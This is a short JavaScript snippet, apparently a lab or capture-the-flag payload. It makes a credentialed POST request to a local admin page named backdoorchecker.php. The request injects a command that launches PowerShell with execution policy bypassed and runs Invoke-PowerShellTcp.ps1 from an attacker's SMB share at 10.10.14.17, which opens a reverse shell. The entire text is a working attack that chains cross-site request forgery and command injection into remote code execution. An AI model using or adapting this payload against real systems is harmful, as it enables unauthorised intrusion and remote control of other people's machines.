var xhr = new XMLHttpRequest();
var url = "http://localhost/admin/backdoorchecker.php";
var params = "cmd=dir | powershell -exec bypass -f \\\\10.10.14.17\\kali\\Invoke-PowerShellTcp.ps1";
xhr.open("POST", url);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;
xhr.send(params);

